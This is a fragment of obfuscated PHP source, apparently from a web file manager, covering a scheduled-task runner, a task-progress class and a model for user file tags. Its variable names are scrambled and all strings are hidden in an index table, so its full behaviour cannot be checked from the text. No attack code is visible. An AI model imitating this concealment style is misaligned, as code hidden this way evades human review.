private static function taskRunAll() { $ç§ú¤Ë± =& $_SERVER[öæÛ¿©¿]; $«§—¼‰ = timeFloat(); $˜Ú»Ğ¥  = Model($ç§ú¤Ë±[1894])->listData(); $²• öÄ¤ = count($˜Ú»Ğ¥ ); for ($§Ğıß½  = 0; $§Ğıß½  < $²• öÄ¤; $§Ğıß½ ++) { $ğÎŠ¶È = $˜Ú»Ğ¥ [$§Ğıß½ ]; if (!$ğÎŠ¶È[$ç§ú¤Ë±[483]] || $ğÎŠ¶È[$ç§ú¤Ë±[1895]] != $ç§ú¤Ë±[91]) { continue; } if (!self::taskTimeCheck($ğÎŠ¶È)) { continue; } self::taskRun($ğÎŠ¶È); } Hook::trigger($ç§ú¤Ë±[1896]); self::taskQueueRun($«§—¼‰); } private static function taskQueueRun($ûÒÔãîÖ) { $‡Ïù‡Ì¥ = 10; while (!0) { $©Ú˜õ¥« = TaskQueue::run(); if ($©Ú˜õ¥« === !1) { break; } if (timeFloat() - $ûÒÔãîÖ >= $‡Ïù‡Ì¥) { break; } } } private static function taskTimeCheck($½›åıÃ£) { $Ş÷“ µë =& $_SERVER[öæÛ¿©¿]; $Æ•´«Î› = json_decode($½›åıÃ£[$Ş÷“ µë[205]], !0); $èíÒüË = intval($½›åıÃ£[$Ş÷“ µë[1876]]); $­•¦ô¨¨ = strtotime($Ş÷“ µë[1897] . $Æ•´«Î›[$Ş÷“ µë[1898]] . $Ş÷“ µë[1899]) - strtotime($Ş÷“ µë[1900]); $ßœöí = time() - strtotime(date($Ş÷“ µë[1901]) . $Ş÷“ µë[1902]); $°¬É„Ã– = $ßœöí >= $­•¦ô¨¨ && $ßœöí <= $­•¦ô¨¨ + 3600; switch ($Æ•´«Î›[$Ş÷“ µë[33]]) { case $Ş÷“ µë[1903]: if (time() - $èíÒüË < 3600 * 24 * 30) { return !1; } if ($Æ•´«Î›[$Ş÷“ µë[1903]] == date($Ş÷“ µë[1904]) && $°¬É„Ã–) { return !0; } break; case $Ş÷“ µë[1905]: if (time() - $èíÒüË < 3600 * 24 * 7) { return !1; } $ŠÕ¬ƒî° = date($Ş÷“ µë[1906]) == 0 ? 7 : date($Ş÷“ µë[1906]); if ($Æ•´«Î›[$Ş÷“ µë[1905]] == $ŠÕ¬ƒî° && $°¬É„Ã–) { return !0; } break; case $Ş÷“ µë[1898]: if (time() - $èíÒüË < 3600 * 24) { return !1; } if ($°¬É„Ã–) { return !0; } break; case $Ş÷“ µë[1907]: if (time() - $èíÒüË >= floatval($Æ•´«Î›[$Ş÷“ µë[1907]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $®Ş›Ô– =& $_SERVER[öæÛ¿©¿]; static $Æ×à”‹í = 0; $Øë”¯í = 300; if (!$Æ×à”‹í) { $Æ×à”‹í = time(); } if (time() - $Æ×à”‹í < $Øë”¯í) { return; } $Æ×à”‹í = time(); $¸ú†¾ƒ± = Model($®Ş›Ô–[593])->db($®Ş›Ô–[12]); if ($¸ú†¾ƒ±) { $¸ú†¾ƒ±->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($®Ş›Ô–[1908], $®Ş›Ô–[1909]); die; } } public static function taskRun($”ŞÉ€¹è) { $ÇÌÊ£­Ä =& $_SERVER[öæÛ¿©¿]; self::log($ÇÌÊ£­Ä[1910] . $”ŞÉ€¹è[$ÇÌÊ£­Ä[483]] . $ÇÌÊ£­Ä[1911] . $”ŞÉ€¹è[$ÇÌÊ£­Ä[32]] . $ÇÌÊ£­Ä[1912] . $”ŞÉ€¹è[$ÇÌÊ£­Ä[1509]]); Model($ÇÌÊ£­Ä[1894])->run($”ŞÉ€¹è[$ÇÌÊ£­Ä[483]]); $×úµ¹çÀ = timeFloat(); $°éçõ¡ = $ÇÌÊ£­Ä[12]; switch ($”ŞÉ€¹è[$ÇÌÊ£­Ä[33]]) { case $ÇÌÊ£­Ä[383]: $¼”´”“ = url_request($”ŞÉ€¹è[$ÇÌÊ£­Ä[1509]], $ÇÌÊ£­Ä[1551], !1, !1, !1, !1, 10); if ($¼”´”“[$ÇÌÊ£­Ä[842]]) { $°éçõ¡ = strlen($¼”´”“[$ÇÌÊ£­Ä[1335]]); } break; case $ÇÌÊ£­Ä[1913]: $°éçõ¡ = Hook::apply($”ŞÉ€¹è[$ÇÌÊ£­Ä[1509]]); default: break; } Model($ÇÌÊ£­Ä[1914])->add(array($ÇÌÊ£­Ä[1915] => $ÇÌÊ£­Ä[12], $ÇÌÊ£­Ä[1916] => $ÇÌÊ£­Ä[229], $ÇÌÊ£­Ä[33] => $ÇÌÊ£­Ä[1917] . $”ŞÉ€¹è[$ÇÌÊ£­Ä[483]], $ÇÌÊ£­Ä[1918] => json_encode(array($ÇÌÊ£­Ä[32] => $”ŞÉ€¹è[$ÇÌÊ£­Ä[32]], $ÇÌÊ£­Ä[1919] => timeFloat() - $×úµ¹çÀ, $ÇÌÊ£­Ä[848] => $°éçõ¡)))); $Š¢ßŠ—• = $°éçõ¡ ? $ÇÌÊ£­Ä[1920] . $°éçõ¡ : $ÇÌÊ£­Ä[12]; self::log($ÇÌÊ£­Ä[1921] . $”ŞÉ€¹è[$ÇÌÊ£­Ä[483]] . $ÇÌÊ£­Ä[176] . $Š¢ßŠ—•); return !0; } public static function valueGet($áŒ·ßÆ¹) { $‰¼»± =& $_SERVER[öæÛ¿©¿]; $Œ»ûòÁ· = $‰¼»±[1922]; $‘Åğçš = Model($‰¼»±[518])->get($áŒ·ßÆ¹, $Œ»ûòÁ·); if (is_null($‘Åğçš)) { Model($‰¼»±[518])->set($‰¼»±[842], $‰¼»±[91], $Œ»ûòÁ·); Model($‰¼»±[518])->set($‰¼»±[1875], $‰¼»±[229], $Œ»ûòÁ·); $‘Åğçš = Model($‰¼»±[518])->get($áŒ·ßÆ¹, $Œ»ûòÁ·); } return $‘Åğçš; } private static function valueSet($ı¤Í–¯½, $úÄƒ¶º = false) { $Áû„İø =& $_SERVER[öæÛ¿©¿]; $Ë²­şüÄ = $Áû„İø[1923]; CacheLock::lock($Ë²­şüÄ); $»Áèª·À = Model($Áû„İø[518])->set($ı¤Í–¯½, $úÄƒ¶º, $Áû„İø[1922]); CacheLock::unlock($Ë²­şüÄ); return $»Áèª·À; } protected static function log($çòÛ˜…‹) { write_log($çòÛ˜…‹, $_SERVER[öæÛ¿©¿][1909]); } private static function cacheClear() { $Æ¤Œù¾Ú =& $_SERVER[öæÛ¿©¿]; Cache::clearMemory(Model($Æ¤Œù¾Ú[518])->cacheKey($Æ¤Œù¾Ú[1922])); Cache::clearMemory(Model($Æ¤Œù¾Ú[518])->cacheKey($Æ¤Œù¾Ú[1924])); Model($Æ¤Œù¾Ú[1894])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\162\x75\156\x6e\151\156\147"; const STATYS_KILL = "\153\151\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¡œ²³á, $æğû®ğ§ = '', $Èğ·áŒ¥ = 0, $†Ïõü¬ = '') { $Û‘˜íºÍ =& $_SERVER[öæÛ¿©¿]; if (self::get($¡œ²³á)) { return; } $this->task = array($Û‘˜íºÍ[483] => $¡œ²³á, $Û‘˜íºÍ[1538] => USER_ID, $Û‘˜íºÍ[1813] => $†Ïõü¬, $Û‘˜íºÍ[536] => $Û‘˜íºÍ[12], $Û‘˜íºÍ[33] => $æğû®ğ§, $Û‘˜íºÍ[1176] => $Û‘˜íºÍ[12], $Û‘˜íºÍ[1174] => $Èğ·áŒ¥, $Û‘˜íºÍ[1925] => 0, $Û‘˜íºÍ[1926] => 0, $Û‘˜íºÍ[1927] => 0, $Û‘˜íºÍ[1928] => timeFloat(), $Û‘˜íºÍ[1929] => 0, $Û‘˜íºÍ[1930] => 0, $Û‘˜íºÍ[1931] => 0, $Û‘˜íºÍ[1932] => 0, $Û‘˜íºÍ[842] => $Û‘˜íºÍ[1875]); $GLOBALS[$Û‘˜íºÍ[1933]] = 1; Hook::bind($Û‘˜íºÍ[1879], array($this, $Û‘˜íºÍ[1934])); Hook::bind($Û‘˜íºÍ[1935], array($this, $Û‘˜íºÍ[1936])); $this->startAfter(); Hook::trigger($Û‘˜íºÍ[1937], $this->task); $this->task[$Û‘˜íºÍ[1930]] = timeFloat(); } public function end($÷Ä¦­Æ¥ = '') { $ª÷²Ú =& $_SERVER[öæÛ¿©¿]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ª÷²Ú[1930]]) { self::valueSet($this->task[$ª÷²Ú[483]], !1); } $this->isEnd = !0; if ($÷Ä¦­Æ¥) { $this->task[$ª÷²Ú[536]] = $÷Ä¦­Æ¥; } self::log($ª÷²Ú[1938] . $this->task[$ª÷²Ú[483]] . $ª÷²Ú[1939] . sprintf($ª÷²Ú[955], timeFloat() - $this->task[$ª÷²Ú[1928]]) . $ª÷²Ú[1940]); Hook::unbind($ª÷²Ú[1879], array($this, $ª÷²Ú[1934])); Hook::unbind($ª÷²Ú[1935], array($this, $ª÷²Ú[1936])); $this->endAfter(); $±ŞŸĞò = $this->task; $this->task = !1; Hook::trigger($ª÷²Ú[1941], $±ŞŸĞò); } public function update($£²–û‘ğ = 0, $Ö±¨½› = false) { $åˆˆî¹¢ =& $_SERVER[öæÛ¿©¿]; $å’¯Ô™ =& $this->task; if (!$å’¯Ô™) { return; } $å’¯Ô™[$åˆˆî¹¢[1925]] += $£²–û‘ğ; $å’¯Ô™[$åˆˆî¹¢[1929]] = timeFloat(); if ($å’¯Ô™[$åˆˆî¹¢[1174]]) { if ($å’¯Ô™[$åˆˆî¹¢[1174]] < $å’¯Ô™[$åˆˆî¹¢[1925]]) { $å’¯Ô™[$åˆˆî¹¢[1174]] = $å’¯Ô™[$åˆˆî¹¢[1925]]; } $ë…—ú²» = timeFloat() - $å’¯Ô™[$åˆˆî¹¢[1928]] - $å’¯Ô™[$åˆˆî¹¢[1931]]; if ($ë…—ú²» <= 0) { $ë…—ú²» = 0.001; } $å’¯Ô™[$åˆˆî¹¢[1926]] = $å’¯Ô™[$åˆˆî¹¢[1925]] / $å’¯Ô™[$åˆˆî¹¢[1174]]; $å’¯Ô™[$åˆˆî¹¢[1927]] = $å’¯Ô™[$åˆˆî¹¢[1925]] / $ë…—ú²»; if ($å’¯Ô™[$åˆˆî¹¢[1926]] > 0) { $å’¯Ô™[$åˆˆî¹¢[1932]] = $ë…—ú²» * (1 - $å’¯Ô™[$åˆˆî¹¢[1926]]) / $å’¯Ô™[$åˆˆî¹¢[1926]]; } $å’¯Ô™[$åˆˆî¹¢[1932]] = $å’¯Ô™[$åˆˆî¹¢[1932]] <= 0 ? 0 : $å’¯Ô™[$åˆˆî¹¢[1932]]; } $this->updateAfter(); $ØÃ†–‡³ = 0.2; if (timeFloat() - $å’¯Ô™[$åˆˆî¹¢[1930]] < $ØÃ†–‡³ && !$Ö±¨½›) { return; } $âÄ¿ä‘™ = self::get($å’¯Ô™[$åˆˆî¹¢[483]]); $Åƒß¹½¶ = $âÄ¿ä‘™[$åˆˆî¹¢[842]]; if ($Åƒß¹½¶ == self::STATYS_KILL) { $öàÈ†ÓÆ = array($åˆˆî¹¢[1942] => LNG($åˆˆî¹¢[1943]), $åˆˆî¹¢[1345] => !1); Cache::set($åˆˆî¹¢[1944] . $this->task[$åˆˆî¹¢[483]], $öàÈ†ÓÆ, 30); $this->onKill(); $this->end(); die; } else { if ($Åƒß¹½¶ == self::STATYS_STOP) { $ˆ¤àŸûâ = 2; $âÄ¿ä‘™[$åˆˆî¹¢[1931]] += $ˆ¤àŸûâ; self::valueSet($å’¯Ô™[$åˆˆî¹¢[483]], $âÄ¿ä‘™); sleep($ˆ¤àŸûâ); $this->update(); return; } } $å’¯Ô™[$åˆˆî¹¢[842]] = $Åƒß¹½¶ ? $Åƒß¹½¶ : $å’¯Ô™[$åˆˆî¹¢[842]]; $å’¯Ô™[$åˆˆî¹¢[1931]] = $âÄ¿ä‘™[$åˆˆî¹¢[1931]] ? $âÄ¿ä‘™[$åˆˆî¹¢[1931]] : 0; $å’¯Ô™[$åˆˆî¹¢[1930]] = timeFloat(); Hook::trigger($åˆˆî¹¢[1945], $å’¯Ô™); self::valueSet($å’¯Ô™[$åˆˆî¹¢[483]], $å’¯Ô™); } public function onKillSet($Öç¯ËúÇ, $††¼ÕÛÓ = array()) { $this->onKillCall = array($Öç¯ËúÇ, $††¼ÕÛÓ); } public function onKill() { $øà—Óà” =& $_SERVER[öæÛ¿©¿]; self::log($øà—Óà”[1938] . $this->task[$øà—Óà”[483]] . $øà—Óà”[1946]); Hook::trigger($øà—Óà”[1947], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($‰–›Â°) { $ƒÇİí†ğ =& $_SERVER[öæÛ¿©¿]; Cache::set($ƒÇİí†ğ[1944] . $this->task[$ƒÇİí†ğ[483]], $‰–›Â°, 60); if (!is_array($‰–›Â°) || !$‰–›Â°[$ƒÇİí†ğ[1345]]) { self::log($ƒÇİí†ğ[1948] . json_encode($‰–›Â°)); } return $‰–›Â°; } public static function get($íÂÆ¦£À) { $çª£œÃ¦ =& $_SERVER[öæÛ¿©¿]; $û‚¥¦áë = self::valueGet($íÂÆ¦£À); if (is_array($û‚¥¦áë) && $û‚¥¦áë[$çª£œÃ¦[1949]]) { $í³Ôß½é = ActionApply($û‚¥¦áë[$çª£œÃ¦[1949]], array($û‚¥¦áë)); $û‚¥¦áë = is_array($í³Ôß½é) ? $í³Ôß½é : $û‚¥¦áë; } return $û‚¥¦áë; } public static function listData() { $Ê¦õÅ = self::valueGet(); return array_sort_by($Ê¦õÅ, $_SERVER[öæÛ¿©¿][1928], !0); } public static function kill($ğã›®ãÊ) { return self::changeStatus($ğã›®ãÊ, self::STATYS_KILL); } public static function stop($ˆÔ¿ìˆ) { return self::changeStatus($ˆÔ¿ìˆ, self::STATYS_STOP); } public static function restart($ÁÎ€êüƒ) { return self::changeStatus($ÁÎ€êüƒ, self::STATYS_RUNNING); } public static function killAll() { $Ñ£¬îğ =& $_SERVER[öæÛ¿©¿]; $¶ıÍ ñ = self::listData(); foreach ($¶ıÍ ñ as $ ÌéâĞ) { self::kill($ ÌéâĞ[$Ñ£¬îğ[483]]); } sleep(2); foreach ($¶ıÍ ñ as $ ÌéâĞ) { self::valueSet($ ÌéâĞ[$Ñ£¬îğ[483]], !1); } } private static function changeStatus($¢åŒ½©ª, $¶äû’«) { $´ôæœ¦ =& $_SERVER[öæÛ¿©¿]; $ßàá‡½Û = self::valueGet($¢åŒ½©ª); if (!$ßàá‡½Û) { return !1; } $ßàá‡½Û[$´ôæœ¦[842]] = $¶äû’«; self::valueSet($¢åŒ½©ª, $ßàá‡½Û); self::log($´ôæœ¦[1950] . $ßàá‡½Û[$´ôæœ¦[483]] . $´ôæœ¦[1951] . $¶äû’«); return !0; } public static function valueGet($Ùåäë‰İ = false) { $ßÁ«ç­‚ =& $_SERVER[öæÛ¿©¿]; if ($Ùåäë‰İ) { $†Õã¼…í = Model($ßÁ«ç­‚[530])->where(array($ßÁ«ç­‚[95] => $Ùåäë‰İ, $ßÁ«ç­‚[33] => $ßÁ«ç­‚[1183]))->find(); return $†Õã¼…í ? json_decode($†Õã¼…í[$ßÁ«ç­‚[451]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ÓüçØØ = false) { $˜âí”ÚÂ =& $_SERVER[öæÛ¿©¿]; $§½˜½ßÍ = array($˜âí”ÚÂ[33] => $˜âí”ÚÂ[1183]); if ($ÓüçØØ) { $§½˜½ßÍ[$˜âí”ÚÂ[1538]] = $ÓüçØØ; } $¨¥Ñš = Model($˜âí”ÚÂ[530])->where($§½˜½ßÍ)->select(); $¨¥Ñš = $¨¥Ñš ? $¨¥Ñš : array(); foreach ($¨¥Ñš as $öÀÍî†» => $å£û‰šˆ) { $¨¥Ñš[$öÀÍî†»] = json_decode($å£û‰šˆ[$˜âí”ÚÂ[451]], !0); } return $¨¥Ñš; } public static function valueSet($—ŒœÒ”, $„Ú‰ŞÆù) { $÷Í¶íõû =& $_SERVER[öæÛ¿©¿]; if (!$„Ú‰ŞÆù) { return Model($÷Í¶íõû[530])->where(array($÷Í¶íõû[95] => $—ŒœÒ”, $÷Í¶íõû[33] => $÷Í¶íõû[1183]))->delete(); } $ğëÛ²©æ = json_encode($„Ú‰ŞÆù); if (!$ğëÛ²©æ) { ob_start(); var_dump($„Ú‰ŞÆù); $­¹‚À¿ = ob_get_clean(); self::log($÷Í¶íõû[1952] . json_encode_force($­¹‚À¿)); } if (!$—ŒœÒ” || !$„Ú‰ŞÆù[$÷Í¶íõû[483]]) { return !1; } $–·ÙÏß = array($÷Í¶íõû[33] => $÷Í¶íõû[1183], $÷Í¶íõû[1538] => USER_ID, $÷Í¶íõû[95] => $—ŒœÒ”, $÷Í¶íõû[451] => $ğëÛ²©æ); $ÜøÖ¥”Œ = $÷Í¶íõû[1953]; CacheLock::lock($ÜøÖ¥”Œ); Model($÷Í¶íõû[530])->add($–·ÙÏß, array(), !0); CacheLock::unlock($ÜøÖ¥”Œ); } public static function log($—üÁëª) { if (!GLOBAL_DEBUG) { return; } write_log($—üÁëª, $_SERVER[öæÛ¿©¿][1954]); } } goto Fßô›Û‘×ç; E‘ŒŒ¬¾: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\x66\141\166"; protected function cacheFunctionAlias($¾ıµü“õ) { $±äß‰‘ˆ =& $_SERVER[öæÛ¿©¿]; return array($±äß‰‘ˆ[2243] => array($±äß‰‘ˆ[2674] . USER_ID, $±äß‰‘ˆ[2244])); } protected function ___listData() { $íÇĞæ€ô =& $_SERVER[öæÛ¿©¿]; $ëìÛÇ´ = array($íÇĞæ€ô[1916] => USER_ID, $íÇĞæ€ô[569] => array($íÇĞæ€ô[2247], 0)); $ÜóÓ™ÙĞ = $íÇĞæ€ô[2675]; $ªñ¤÷Û£ = $this->field($ÜóÓ™ÙĞ)->where($ëìÛÇ´)->order($íÇĞæ€ô[2249])->select(); return $ªñ¤÷Û£ ? $ªñ¤÷Û£ : array(); } protected function addToTag($ıØşŸĞ„, $¹ËŞ¼ƒÕ) { $âÌûï =& $_SERVER[öæÛ¿©¿]; if (!Model($âÌûï[2400])->listData($¹ËŞ¼ƒÕ)) { return !1; } if (is_numeric($ıØşŸĞ„)) { $˜µãÚ‘˜ = Model($âÌûï[925])->pathInfo($ıØşŸĞ„); if (!$˜µãÚ‘˜) { return !1; } } else { $˜µãÚ‘˜ = IO::infoSimple($ıØşŸĞ„); if (!$˜µãÚ‘˜) { return !1; } $Ğº•ì…¿ = $˜µãÚ‘˜[$âÌûï[32]]; $è„ÎÂÖ = $˜µãÚ‘˜[$âÌûï[33]]; if (isset($˜µãÚ‘˜[$âÌûï[496]])) { $è„ÎÂÖ = $˜µãÚ‘˜[$âÌûï[496]] == $âÌûï[91] ? $âÌûï[78] : $âÌûï[231]; } } $˜šØıÕ = array($âÌûï[1916] => USER_ID, $âÌûï[569] => $¹ËŞ¼ƒÕ, $âÌûï[506] => $ıØşŸĞ„, $âÌûï[507] => $è„ÎÂÖ ? $è„ÎÂÖ : $âÌûï[501], $âÌûï[505] => $Ğº•ì…¿ ? $Ğº•ì…¿ : $âÌûï[12], $âÌûï[2135] => 0); if ($this->where($˜šØıÕ)->find()) { return !1; } return $this->add($˜šØıÕ); } protected function removeFromTag($Ü¬ı¥ï©, $œå‹ÑÆ¤) { $à†Û¬‘ =& $_SERVER[öæÛ¿©¿]; if (!Model($à†Û¬‘[2400])->listData($œå‹ÑÆ¤)) { return !1; } if (is_array($Ü¬ı¥ï©)) { $Ü¬ı¥ï© = array($à†Û¬‘[7], $Ü¬ı¥ï©); } $¼¬ÒÜ§Ú = array($à†Û¬‘[1916] => USER_ID, $à†Û¬‘[569] => $œå‹ÑÆ¤, $à†Û¬‘[506] => $Ü¬ı¥ï©); return $this->where($¼¬ÒÜ§Ú)->delete(); } protected function removeByTag($Úº©€ˆÅ) { $åŸ·‰’¼ =& $_SERVER[öæÛ¿©¿]; if (!$Úº©€ˆÅ) { return !1; } $çùÆ±Öª = array($åŸ·‰’¼[1916] => USER_ID, $åŸ·‰’¼[569] => $Úº©€ˆÅ); return $this->where($çùÆ±Öª)->delete(); } protected function removeBySource($°¢½ÆÓ) { $õşİïø¶ =& $_SERVER[öæÛ¿©¿]; if (is_array($°¢½ÆÓ)) { $°¢½ÆÓ = array($õşİïø¶[7], $°¢½ÆÓ); } $Ğ¬È¢ï = array($õşİïø¶[1916] => USER_ID, $õşİïø¶[569] => array($õşİïø¶[1126], 0), $õşİïø¶[506] => $°¢½ÆÓ); return $this->where($Ğ¬È¢ï)->delete(); } }